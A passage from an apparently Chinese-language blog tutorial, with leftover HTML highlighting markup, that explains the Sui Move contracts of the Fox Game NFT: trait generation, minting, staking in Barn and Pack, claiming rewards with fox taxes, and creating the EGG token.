function_ invoke__">borrow</span>(&amp;seed, <span class="number">17</span>), <span class="number">7</span> + shift),</span><br><span class="line">            alpha_index: <span class="title function_ invoke__">select_trait</span>(reg, *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">9</span>), *vec::<span class="title function_ invoke__">borrow</span>(&amp;seed, <span class="number">18</span>), <span class="number">8</span> + shift),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据 A.J. Walker&#x27;s Alias 算法计算属性值</span></span><br><span class="line">        fun <span class="title function_ invoke__">select_trait</span>(reg: &amp;FoCRegistry, seed1: <span class="type">u8</span>, seed2: <span class="type">u8</span>, trait_type: <span class="type">u64</span>): <span class="type">u8</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">trait</span> = (seed1 <span class="keyword">as</span> <span class="type">u64</span>) % vec::<span class="title function_ invoke__">length</span>(vec::<span class="title function_ invoke__">borrow</span>(&amp;reg.rarities, trait_type));</span><br><span class="line">        <span class="keyword">if</span> (seed2 &lt; *vec::<span class="title function_ invoke__">borrow</span>(vec::<span class="title function_ invoke__">borrow</span>(&amp;reg.rarities, trait_type), <span class="keyword">trait</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">return</span> (<span class="keyword">trait</span> <span class="title class_">as</span> <span class="type">u8</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        *vec::<span class="title function_ invoke__">borrow</span>(vec::<span class="title function_ invoke__">borrow</span>(&amp;reg.aliases, trait_type), <span class="keyword">trait</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而 <code>get_attributes</code> 则是根据属性索引值对应从 <code>trait_types</code> 和 <code>trait_data</code> 中将属性的真实值取出并构建成属性数组。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_ invoke__">get_attributes</span>(reg: &amp;<span class="keyword">mut</span> FoCRegistry, fc: &amp;Traits): vector&lt;Attribute&gt;</span><br></pre></td></tr></table></figure><p>而 <code>img_url</code> 则通过上述生成的特征构建出对应的 base64 编码的 svg 图片。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/// Construct an image URL for the NFT.</span></span><br><span class="line">fun <span class="title function_ invoke__">img_url</span>(reg:&amp;<span class="keyword">mut</span> FoCRegistry, fc: &amp;Traits): Url &#123;</span><br><span class="line">    url::<span class="title function_ invoke__">new_unsafe_from_bytes</span>(<span class="title function_ invoke__">token_uri</span>(reg, fc))</span><br><span class="line">&#125;</span><br><span class="line">    fun <span class="title function_ invoke__">token_uri</span>(reg: &amp;<span class="keyword">mut</span> FoCRegistry, foc: &amp;Traits): vector&lt;<span class="type">u8</span>&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">uri</span> = <span class="string">b&quot;data:image/svg+xml;base64,&quot;</span>;</span><br><span class="line">    vec::<span class="title function_ invoke__">append</span>(&amp;<span class="keyword">mut</span> uri, base64::<span class="title function_ invoke__">encode</span>(&amp;<span class="title function_ invoke__">draw_svg</span>(reg, foc)));</span><br><span class="line">    uri</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，我们可以通过 <code>create_foc</code> 方法创建一个 FoxOrChicken NFT。</p><h3><span id="2-3-zhu-zao-nft">2.3 铸造 NFT</span></h3><p>接下来我们看到铸造 NFT 过程，大致过程为：</p><ol><li>判断总供给量是否满足条件；</li><li>如果在 SUI 代币购买阶段，则转移 SUI 代币，否则，需要支付 EGG 代币进行铸造，EGG 的铸造和销毁在之后的章节中介绍；</li><li>铸造 NFT 并根据50%概率判断是否被质押的狐狸盗走；</li><li>如果选择质押则将 NFT 转入质押，否则转入铸造者的账户中。</li></ol><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件： fox.move</span></span><br><span class="line">    <span class="comment">/// mint a fox or chicken</span></span><br><span class="line">    public entry fun <span class="title function_ invoke__">mint</span>(</span><br><span class="line">        global: &amp;<span class="keyword">mut</span> Global,</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;,</span><br><span class="line">        amount: <span class="type">u64</span>,</span><br><span class="line">        stake: <span class="type">bool</span>,</span><br><span class="line">        pay_sui: vector&lt;Coin&lt;SUI&gt;&gt;,</span><br><span class="line">        pay_egg: vector&lt;Coin&lt;EGG&gt;&gt;,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="title function_ invoke__">assert_enabled</span>(global);</span><br><span class="line">        <span class="comment">// 检查供应量是否超出总供应量</span></span><br><span class="line">        <span class="built_in">assert!</span>(amount &gt; <span class="number">0</span> &amp;&amp; amount &lt;= config::<span class="title function_ invoke__">max_single_mint</span>(), EINVALID_MINTING);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">token_supply</span> = token_helper::<span class="title function_ invoke__">total_supply</span>(&amp;global.foc_registry);</span><br><span class="line">        <span class="built_in">assert!</span>(token_supply + amount &lt;= config::<span class="title function_ invoke__">target_max_tokens</span>(), EALL_MINTED);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">receiver_addr</span> = <span class="title function_ invoke__">sender</span>(ctx);</span><br><span class="line">        <span class="comment">// 处理 SUI 代币付款</span></span><br><span class="line">        <span class="keyword">if</span> (token_supply &lt; config::<span class="title function_ invoke__">paid_tokens</span>()) &#123;</span><br><span class="line">            <span class="built_in">assert!</span>(vec::<span class="title function_ invoke__">length</span>(&amp;pay_sui) &gt; <span class="number">0</span>, EINSUFFICIENT_SUI_BALANCE);</span><br><span class="line">            <span class="built_in">assert!</span>(token_supply + amount &lt;= config::<span class="title function_ invoke__">paid_tokens</span>(), EALL_MINTED);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">price</span> = config::<span class="title function_ invoke__">mint_price</span>() * amount;</span><br><span class="line">            <span class="keyword">let</span> (paid, remainder) = <span class="title function_ invoke__">merge_and_split</span>(pay_sui, price, ctx);</span><br><span class="line">            coin::<span class="title function_ invoke__">put</span>(&amp;<span class="keyword">mut</span> global.balance, paid);</span><br><span class="line">            <span class="title function_ invoke__">transfer</span>(remainder, <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// EGG 代币付款阶段返还 SUI 代币</span></span><br><span class="line">            <span class="keyword">if</span> (vec::<span class="title function_ invoke__">length</span>(&amp;pay_sui) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">transfer</span>(<span class="title function_ invoke__">merge</span>(pay_sui, ctx), <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                vec::<span class="title function_ invoke__">destroy_empty</span>(pay_sui);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">id</span> = object::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">seed</span> = <span class="title function_ invoke__">hash</span>(object::<span class="title function_ invoke__">uid_to_bytes</span>(&amp;id));</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">total_egg_cost</span>: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">tokens</span>: vector&lt;FoxOrChicken&gt; = vec::empty&lt;FoxOrChicken&gt;();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; amount) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token_index</span> = token_supply + i + <span class="number">1</span>;</span><br><span class="line">            <span class="comment">// 判断是否被狐狸盗走</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">recipient</span>: address = <span class="title function_ invoke__">select_recipient</span>(&amp;<span class="keyword">mut</span> global.pack, receiver_addr, seed, token_index);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token</span> = token_helper::<span class="title function_ invoke__">create_foc</span>(&amp;<span class="keyword">mut</span> global.foc_registry, ctx);</span><br><span class="line">            <span class="keyword">if</span> (!stake || recipient != receiver_addr) &#123;</span><br><span class="line">                <span class="title function_ invoke__">transfer</span>(token, receiver_addr);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                vec::<span class="title function_ invoke__">push_back</span>(&amp;<span class="keyword">mut</span> tokens, token);</span><br><span class="line">            &#125;;</span><br><span class="line">            <span class="comment">// 计算 EGG 代币花费</span></span><br><span class="line">            total_egg_cost = total_egg_cost + <span class="title function_ invoke__">mint_cost</span>(token_index);</span><br><span class="line">            i = i + <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 如果需要 EGG 代币花费，则转移并销毁 EGG 代币</span></span><br><span class="line">        <span class="keyword">if</span> (total_egg_cost &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">assert!</span>(vec::<span class="title function_ invoke__">length</span>(&amp;pay_egg) &gt; <span class="number">0</span>, EINSUFFICIENT_EGG_BALANCE);</span><br><span class="line">            <span class="comment">// burn EGG</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">total_egg</span> = <span class="title function_ invoke__">merge</span>(pay_egg, ctx);</span><br><span class="line">            <span class="built_in">assert!</span>(coin::<span class="title function_ invoke__">value</span>(&amp;total_egg) &gt;= total_egg_cost, EINSUFFICIENT_EGG_BALANCE);</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">paid</span> = coin::<span class="title function_ invoke__">split</span>(&amp;<span class="keyword">mut</span> total_egg, total_egg_cost, ctx);</span><br><span class="line">            egg::<span class="title function_ invoke__">burn</span>(treasury_cap, paid);</span><br><span class="line">            <span class="title function_ invoke__">transfer</span>(total_egg, <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (vec::<span class="title function_ invoke__">length</span>(&amp;pay_egg) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="title function_ invoke__">transfer</span>(<span class="title function_ invoke__">merge</span>(pay_egg, ctx), <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                vec::<span class="title function_ invoke__">destroy_empty</span>(pay_egg);</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 铸造的同时质押，则将 NFT 转入重要中</span></span><br><span class="line">        <span class="keyword">if</span> (stake) &#123;</span><br><span class="line">            barn::<span class="title function_ invoke__">stake_many_to_barn_and_pack</span>(</span><br><span class="line">                &amp;<span class="keyword">mut</span> global.barn_registry,</span><br><span class="line">                &amp;<span class="keyword">mut</span> global.barn,</span><br><span class="line">                &amp;<span class="keyword">mut</span> global.pack,</span><br><span class="line">                tokens,</span><br><span class="line">                ctx</span><br><span class="line">            );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            vec::<span class="title function_ invoke__">destroy_empty</span>(tokens);</span><br><span class="line">        &#125;;</span><br><span class="line">        object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3><span id="2-4-zhi-ya-nft">2.4 质押 NFT</span></h3><p>质押 NFT 时，我们通过 NFT 的属性值 <code>is_chicken</code> 来将不同的NFT放置到不同的容器中。其中，狐狸放置在 Pack 中，鸡放置在 Barn 中。每一个 NFT 在放置的同时记录对应的 owner 地址和用于计算质押收益的时间戳。</p><p>对于 <code>Barn</code>，除了记录 NFT 对象 <code>ID</code> 与 <code>Stake</code> 之间对应关系的 <code>items</code>，还增加了一个 <code>dynamic_field</code>，用于记录 owner 地址所有质押的 NFT 的数组： <code>dynamic_field: &lt;address, vector&lt;ID&gt;&gt;</code> 。</p><p>同理，<code>Pack</code> 也用 <code>items</code> 记录了质押的所有 NFT，用 Alpha 进行了分类存储，在 <code>ObjectTable&lt;u8, ObjectTable&lt;u64, Stake&gt;&gt;</code> 的结构中，第一个 <code>u8</code> 对应于 Alpha 值，第二个 <code>ObjectTable&lt;u64, Stake&gt;</code> 则是用 <code>ObjectTable</code> 实现了 <code>vector</code> 的功能，<code>u64</code> 对应 <code>Stake</code> 的索引，因此，item_size 这个属性记录了每个 Alpha 值对应 <code>ObjectTable</code> 的大小。</p><p><code>pack_indices</code> 用于记录每个 NFT 所在数组中的索引，最后还有一个 <code>dynamic_field</code> 记录了 owner 地址的所有质押的 NFT 的数组。</p><p>以上关于 Barn 和 Pack 的设计目的在于：</p><ol><li>当 <code>FoxOrChicken</code> 成为 <code>Stake</code> 的一个属性时，在区块链上无法追踪，因此，只能通过 <code>Stake</code> 的 Object ID 进行追踪，items 都是为了保证能直接通过 NFT 的 Object ID 来对应到 Stake；</li><li>记录 owner 地址的所有质押的 NFT ID 的数组是为了方便在业务中查询某个地址的质押的 NFT，<code>dynamic_field</code> 可以方便查询。</li></ol><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line">    <span class="comment">// struct to store a stake&#x27;s token, owner, and earning values</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Stake</span> has key, store &#123;</span><br><span class="line">    id: UID,</span><br><span class="line">    item: FoxOrChicken,</span><br><span class="line">    value: <span class="type">u64</span>, <span class="comment">// 用于质押收益计算的时间戳</span></span><br><span class="line">    owner: address,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Barn</span> has key, store &#123;</span><br><span class="line">    id: UID,</span><br><span class="line">    items: ObjectTable&lt;ID, Stake&gt;,</span><br><span class="line">    <span class="comment">// staked: Table&lt;address, vector&lt;ID&gt;&gt;, // address -&gt; stake_id</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Pack</span> has key, store &#123;</span><br><span class="line">    id: UID,</span><br><span class="line">    items: ObjectTable&lt;<span class="type">u8</span>, ObjectTable&lt;<span class="type">u64</span>, Stake&gt;&gt;,</span><br><span class="line">    <span class="comment">// alpha -&gt; index -&gt; Stake</span></span><br><span class="line">    item_size: vector&lt;<span class="type">u64</span>&gt;,</span><br><span class="line">    <span class="comment">// size for each alpha</span></span><br><span class="line">    pack_indices: Table&lt;ID, <span class="type">u64</span>&gt;,</span><br><span class="line">    <span class="comment">// staked: Table&lt;address, vector&lt;ID&gt;&gt;, // address -&gt; stake_id</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们接下来看到如何质押一个 Chicken 的 NFT，方法调用层级为 <code>stake_many_to_barn_and_pack -&gt; stake_chicken_to_barn -&gt; add_chicken_to_barn, record_staked</code> ：</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件： Token_helper.move</span></span><br><span class="line">        <span class="comment">// 质押多个 NFT</span></span><br><span class="line">        public fun <span class="title function_ invoke__">stake_many_to_barn_and_pack</span>(</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> BarnRegistry,</span><br><span class="line">        barn: &amp;<span class="keyword">mut</span> Barn,</span><br><span class="line">        pack: &amp;<span class="keyword">mut</span> Pack,</span><br><span class="line">        tokens: vector&lt;FoxOrChicken&gt;,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = vec::length&lt;FoxOrChicken&gt;(&amp;tokens);</span><br><span class="line">        <span class="keyword">while</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token</span> = vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> tokens);</span><br><span class="line">            <span class="comment">// 通过属性 is_chicken 判断质押方向</span></span><br><span class="line">            <span class="keyword">if</span> (token_helper::<span class="title function_ invoke__">is_chicken</span>(&amp;token)) &#123;</span><br><span class="line">                <span class="comment">// 更新收益</span></span><br><span class="line">                <span class="title function_ invoke__">update_earnings</span>(reg, ctx);</span><br><span class="line">                <span class="title function_ invoke__">stake_chicken_to_barn</span>(reg, barn, token, ctx);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="title function_ invoke__">stake_fox_to_pack</span>(reg, pack, token, ctx);</span><br><span class="line">            &#125;;</span><br><span class="line">            i = i - <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        vec::<span class="title function_ invoke__">destroy_empty</span>(tokens)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">stake_chicken_to_barn</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, barn: &amp;<span class="keyword">mut</span> Barn, item: FoxOrChicken, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        reg.total_chicken_staked = reg.total_chicken_staked + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake_id</span> = <span class="title function_ invoke__">add_chicken_to_barn</span>(reg, barn, item, ctx);</span><br><span class="line">                <span class="comment">// 记录 owner 地址的所有质押的 NFT</span></span><br><span class="line">        <span class="title function_ invoke__">record_staked</span>(&amp;<span class="keyword">mut</span> barn.id, <span class="title function_ invoke__">sender</span>(ctx), stake_id);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">add_chicken_to_barn</span>(reg: &amp;<span class="keyword">mut</span> BarnRegistry, barn: &amp;<span class="keyword">mut</span> Barn, item: FoxOrChicken, ctx: &amp;<span class="keyword">mut</span> TxContext): ID &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">foc_id</span> = object::<span class="title function_ invoke__">id</span>(&amp;item);</span><br><span class="line">        <span class="comment">// 获取当前时间戳</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">value</span> = <span class="title function_ invoke__">timestamp_now</span>(reg, ctx);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake</span> = Stake &#123;</span><br><span class="line">            id: object::<span class="title function_ invoke__">new</span>(ctx),</span><br><span class="line">            item,</span><br><span class="line">            value,</span><br><span class="line">            owner: <span class="title function_ invoke__">sender</span>(ctx),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 生成并添加质押</span></span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake_id</span> = object::<span class="title function_ invoke__">id</span>(&amp;stake);</span><br><span class="line">        <span class="title function_ invoke__">emit</span>(FoCStaked &#123; id: foc_id, owner: <span class="title function_ invoke__">sender</span>(ctx), value &#125;);</span><br><span class="line">        object_table::<span class="title function_ invoke__">add</span>(&amp;<span class="keyword">mut</span> barn.items, foc_id, stake);</span><br><span class="line">        stake_id</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">record_staked</span>(staked: &amp;<span class="keyword">mut</span> UID, account: address, stake_id: ID) &#123;</span><br><span class="line">        <span class="keyword">if</span> (dof::<span class="title function_ invoke__">exists_</span>(staked, account)) &#123;</span><br><span class="line">            vec::<span class="title function_ invoke__">push_back</span>(dof::<span class="title function_ invoke__">borrow_mut</span>(staked, account), stake_id);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            dof::<span class="title function_ invoke__">add</span>(staked, account, vec::<span class="title function_ invoke__">singleton</span>(stake_id));</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同理，质押 Fox 进入 Pack 中的过程也是类似的，这里就不再赘述，方法调用层级为 <code>stake_many_to_barn_and_pack -&gt;</code> <code>stake_fox_to_pack -&gt;``add_fox_to_pack, record_staked</code> 。</p><h3><span id="2-5-ti-qu-nft">2.5 提取 NFT</span></h3><p>提取 Chicken NFT 时，方法调用层级为 <code>claim_many_from_barn_and_pack -&gt; claim_chicken_from_barn -&gt; remove_chicken_from_barn, remove_staked</code></p><p>主要的过程为：</p><ol><li>判断 NFT 类型，根据类型从不同的容器中提取 NFT；</li><li>判断 NFT 是否存在，是否超过最小质押时间；</li><li>计算质押收益；</li><li>如果选择提取 NFT，则收益50%概率被狐狸全部拿走；</li><li>如果只收集鸡蛋，则需要交 20% 作为保护费。</li></ol><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件： token_helper.move</span></span><br><span class="line">    <span class="comment">// 提取多个 NFT</span></span><br><span class="line">        public fun <span class="title function_ invoke__">claim_many_from_barn_and_pack</span>(</span><br><span class="line">        foc_reg: &amp;<span class="keyword">mut</span> FoCRegistry,</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> BarnRegistry,</span><br><span class="line">        barn: &amp;<span class="keyword">mut</span> Barn,</span><br><span class="line">        pack: &amp;<span class="keyword">mut</span> Pack,</span><br><span class="line">        treasury_cap: &amp;<span class="keyword">mut</span> TreasuryCap&lt;EGG&gt;,</span><br><span class="line">        tokens: vector&lt;ID&gt;,</span><br><span class="line">        unstake: <span class="type">bool</span>,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext,</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="comment">// 更新收益</span></span><br><span class="line">        <span class="title function_ invoke__">update_earnings</span>(reg, ctx);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">i</span> = vec::length&lt;ID&gt;(&amp;tokens);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">owed</span>: <span class="type">u64</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> <span class="variable">token_id</span> = vec::<span class="title function_ invoke__">pop_back</span>(&amp;<span class="keyword">mut</span> tokens);</span><br><span class="line">            <span class="comment">// 通过 ID 判断是否为 chickena</span></span><br><span class="line">            <span class="comment">// 计算提取收益 owed</span></span><br><span class="line">            <span class="keyword">if</span> (token_helper::<span class="title function_ invoke__">is_chicken_from_id</span>(foc_reg, token_id)) &#123;</span><br><span class="line">                owed = owed + <span class="title function_ invoke__">claim_chicken_from_barn</span>(reg, barn, token_id, unstake, ctx);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                owed = owed + <span class="title function_ invoke__">claim_fox_from_pack</span>(foc_reg, reg, pack, token_id, unstake, ctx);</span><br><span class="line">            &#125;;</span><br><span class="line">            i = i - <span class="number">1</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 根据 owed 的数量为地址铸造 EGG 代币</span></span><br><span class="line">        <span class="keyword">if</span> (owed == <span class="number">0</span>) &#123; <span class="keyword">return</span> &#125;;</span><br><span class="line">        egg::<span class="title function_ invoke__">mint</span>(treasury_cap, owed, <span class="title function_ invoke__">sender</span>(ctx), ctx);</span><br><span class="line">        vec::<span class="title function_ invoke__">destroy_empty</span>(tokens)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        fun <span class="title function_ invoke__">claim_chicken_from_barn</span>(</span><br><span class="line">        reg: &amp;<span class="keyword">mut</span> BarnRegistry,</span><br><span class="line">        barn: &amp;<span class="keyword">mut</span> Barn,</span><br><span class="line">        foc_id: ID,</span><br><span class="line">        unstake: <span class="type">bool</span>,</span><br><span class="line">        ctx: &amp;<span class="keyword">mut</span> TxContext</span><br><span class="line">    ): <span class="type">u64</span> &#123;</span><br><span class="line">        <span class="comment">// 判断需要提取的 NFT 是否存在</span></span><br><span class="line">        <span class="built_in">assert!</span>(object_table::<span class="title function_ invoke__">contains</span>(&amp;barn.items, foc_id), ENOT_IN_PACK_OR_BARN);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">stake_time</span> = <span class="title function_ invoke__">get_chicken_stake_value</span>(barn, foc_id);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">timenow</span> = <span class="title function_ invoke__">timestamp_now</span>(reg, ctx);</span><br><span class="line">        <span class="comment">// 判断是否超过了 48 小时的最小质押时间</span></span><br><span class="line">        <span class="built_in">assert!</span>(!(unstake &amp;&amp; timenow - stake_time &lt; MINIMUM_TO_EXIT), ESTILL_COLD);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">owed</span>: <span class="type">u64</span>;</span><br><span class="line">        <span class="comment">// 判断是否超过了最大 EGG 铸造量，并计算质押所得</span></span><br><span class="line">        <span class="keyword">if</span> (reg.total_egg_earned &lt; MAXIMUM_GLOBAL_EGG) &#123;</span><br><span class="line">            owed = (timenow - stake_time) * DAILY_EGG_RATE / ONE_DAY_IN_SECOND;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (stake_time &gt; reg.last_claim_timestamp) &#123;</span><br><span class="line">            owed = <span class="number">0</span>; <span class="comment">// $WOOL production stopped already</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// stop earning additional $EGG if it&#x27;s all been earned</span></span><br><span class="line">            owed = (reg.last_claim_timestamp - stake_time) * DAILY_EGG_RATE / ONE_DAY_IN_SECOND;</span><br><span class="line">        &#125;;</span><br><span class="line">                </span><br><span class="line">        <span class="keyword">if</span> (unstake) &#123;</span><br><span class="line">            <span class="comment">// 如果进行提取，则有50%的概率 EGG 全部被盗走</span></span><br><span class="line">            <span class="keyword">let</span> <span class="variable">id</span> = object::<span class="title function_ invoke__">new</span>(ctx);</span><br><span class="line">            <span class="comment">// FIXME</span></span><br><span class="line">            <span class="keyword">if</span> (random::<span class="title function_ invoke__">rand_u64_range_with_seed</span>(<span class="title function_ invoke__">hash</span>(object::<span class="title function_ invoke__">uid_to_bytes</span>(&amp;id)), <span class="number">0</span>, <span class="number">2</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">// 50% chance of all $EGG stolen</span></span><br><span class="line">                <span class="title function_ invoke__">pay_fox_tax</span>(reg, owed);</span><br><span class="line">                owed = <span class="number">0</span>;</span><br><span class="line">            &#125;;</span><br><span class="line">            object::<span class="title function_ invoke__">delete</span>(id);</span><br><span class="line">            <span class="comment">// 更新质押数据，并移除质押，转移 NFT 给 owner 地址</span></span><br><span class="line">            reg.total_chicken_staked = reg.total_chicken_staked - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">let</span> (item, stake_id) = <span class="title function_ invoke__">remove_chicken_from_barn</span>(barn, foc_id, ctx);</span><br><span class="line">            <span class="title function_ invoke__">remove_staked</span>(&amp;<span class="keyword">mut</span> barn.id, <span class="title function_ invoke__">sender</span>(ctx), stake_id);</span><br><span class="line">            transfer::<span class="title function_ invoke__">transfer</span>(item, <span class="title function_ invoke__">sender</span>(ctx));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="comment">// 如果只是收集 EGG，则 20% 作为保护费交给狐狸</span></span><br><span class="line">            <span class="comment">// percentage tax to staked foxes</span></span><br><span class="line">            <span class="title function_ invoke__">pay_fox_tax</span>(reg, owed * EGG_CLAIM_TAX_PERCENTAGE / <span class="number">100</span>);</span><br><span class="line">            <span class="comment">// remainder goes to Chicken owner</span></span><br><span class="line">            owed = owed * (<span class="number">100</span> - EGG_CLAIM_TAX_PERCENTAGE) / <span class="number">100</span>;</span><br><span class="line">            <span class="comment">// 重设质押状态</span></span><br><span class="line">            <span class="title function_ invoke__">set_chicken_stake_value</span>(barn, foc_id, timenow);</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="title function_ invoke__">emit</span>(FoCClaimed &#123; id: foc_id, earned: owed, unstake &#125;);</span><br><span class="line">        owed</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>同理，从 Pack 中提取 Fox  中的过程也是类似的，这里就不再赘述。</p><h3><span id="2-6-chuang-jian-egg-dai-bi-he-shou-ji-egg-dai-bi">2.6 创建 EGG 代币和收集 EGG 代币</span></h3><p>EGG 代币创建过程使用了 one-time-witness 模式，具体可以参考：<a href="https://mp.weixin.qq.com/s/OXLyiUKzpFzAzc-PVxLvTA">Move 高阶语法 | 共学课优秀笔记</a> 中的 Witness 模式一节。</p><p>代币的铸造能力 <code>treasury_cap: TreasuryCap&lt;EGG&gt;</code> 保存为共享对象，但是 <code>mint</code> 和 <code>burn</code> 方法t通过 <code>friend</code> 关键字限制了只能在 <code>fox</code> 和 <code>barn</code> 模块中调用，因此控制了代币的产生和销毁的权限。</p><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文件： egg.move</span></span><br><span class="line">module fox_game::egg &#123;</span><br><span class="line">    <span class="keyword">use</span> std::option;</span><br><span class="line">    <span class="keyword">use</span> sui::coin::&#123;<span class="keyword">Self</span>, Coin, TreasuryCap&#125;;</span><br><span class="line">    <span class="keyword">use</span> sui::transfer;</span><br><span class="line">    <span class="keyword">use</span> sui::tx_context::TxContext;</span><br><span class="line"></span><br><span class="line">    friend fox_game::fox;</span><br><span class="line">    friend fox_game::barn;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EGG</span> has drop &#123;&#125;</span><br><span class="line"></span><br><span class="line">    fun <span class="title function_ invoke__">init</span>(witness: EGG, ctx: &amp;<span class="keyword">mut</span> TxContext) &#123;</span><br><span class="line">        <span class="keyword">let</span> (treasury_cap, metadata) = coin::create_currency&lt;EGG&gt;(</span><br><span class="line">            witness,</span><br><span class="line">            <span class="number">9</span>,</span><br><span class="line">            <span class="string">b&quot;EGG&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;Fox Game Egg&quot;</span>,</span><br><span class="line">            <span class="string">b&quot;Fox game egg coin&quot;</span>,</span><br><span class="line">            option::<span class="title 